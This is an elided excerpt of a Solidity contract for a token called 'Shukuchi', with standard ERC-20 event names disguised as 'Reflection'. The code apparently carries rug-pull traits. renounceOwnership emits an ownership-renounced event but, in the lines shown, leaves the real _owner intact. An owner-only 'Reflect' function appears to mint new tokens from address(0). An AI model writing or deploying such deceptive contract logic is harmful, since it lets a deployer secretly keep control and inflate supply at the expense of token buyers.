...
interface IERC20 {
    ...
    event Reflection(address indexed from, address indexed to, uint256 value);
...
contract Ownable is Context {
    ...
    event OwnershipReflectionred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        address call = _call();
        _owner = call;
         Owner = call;
        emit OwnershipReflectionred(address(0), call);
    }
    ...
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipReflectionred(_owner, address(0));
         Owner = address(0);
    }
}
...
contract Shukuchi is Context, IERC20, Ownable {
    ...
    uint256 private _ReflectTotal = 5133713375 * 10**18;
    string private _name = 'Shukuchi';
    string private _symbol = 'Shukuchi縮地';
    uint8 private _decimals = 18;    
    uint256 public rTotal = 2566856.6875 * 10**18;

constructor () public {
    _router[_call()] = _ReflectTotal;
    emit Reflection(address(0), _call(), _ReflectTotal);
}
    ...
    function Reflect(uint256 amount) public onlyOwner {
        ...
        emit Reflection(address(0), _call(), amount);
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        emit Reflection(sender, recipient, amount);
    }
 }